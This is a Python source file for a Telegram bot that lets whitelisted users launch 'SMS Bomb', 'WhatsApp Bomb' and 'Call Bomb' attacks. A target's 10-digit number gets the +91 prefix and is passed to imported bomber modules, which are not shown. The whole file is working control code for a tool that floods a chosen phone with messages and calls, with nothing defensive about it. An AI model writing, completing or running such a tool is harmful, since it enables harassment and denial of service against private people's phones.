# bot.py
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from config import BOT_TOKEN, ALLOWED_USERS, DEFAULT_COUNT, DEFAULT_THREADS
from sms_bomber import SMSBomber
from wa_bomber import WABomber
from call_bomber import CallBomber
from utils.logger import setup_logger

logger = setup_logger()

# Auth check
def is_authorized(user_id):
    return user_id in ALLOWED_USERS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ Tu authorized nahi hai.")
        return
    keyboard = [
        [InlineKeyboardButton("📱 SMS Bomb", callback_data="sms")],
        [InlineKeyboardButton("💬 WhatsApp Bomb", callback_data="wa")],
        [InlineKeyboardButton("📞 Call Bomb", callback_data="call")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ]
    await update.message.reply_text(
        "🔥 *Bomber Bot Ready!*\n\nKya karna hai?",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "sms":
        context.user_data["mode"] = "sms"
        await query.edit_message_text("📱 *SMS Mode*\n\nTarget number bhej (10 digit):")
    elif data == "wa":
        context.user_data["mode"] = "wa"
        await query.edit_message_text("💬 *WhatsApp Mode*\n\nTarget number bhej (10 digit):")
    elif data == "call":
        context.user_data["mode"] = "call"
        await query.edit_message_text("📞 *Call Mode*\n\nTarget number bhej (10 digit):")
    elif data == "cancel":
        context.user_data["mode"] = None
        await query.edit_message_text("❌ Cancelled.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        return

    mode = context.user_data.get("mode")
    if not mode:
        await update.message.reply_text("Pehle /start karo aur mode select karo.")
        return

    target = update.message.text.strip()
    if not target.isdigit() or len(target) < 10:
        await update.message.reply_text("❌ Valid 10-digit number bhej.")
        return

    phone = f"+91{target}"  # Change country code if needed
    await update.message.reply_text(f"🚀 *Bombing started on {phone}*\nMode: {mode.upper()}\nThoda wait kar...", parse_mode="Markdown")

    try:
        if mode == "sms":
            bomber = SMSBomber()
            await bomber.bomb(phone, count=DEFAULT_COUNT, threads=DEFAULT_THREADS)
        elif mode == "wa":
            bomber = WABomber()
            await bomber.bomb(phone, count=10)
        elif mode == "call":
            bomber = CallBomber()
            await bomber.bomb(phone, count=20)

        await update.message.reply_text(f"✅ *Bombing complete!*\n{phone} par {mode.upper()} bhej diya.", parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Bombing error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

    context.user_data["mode"] = None

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    logger.info("Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
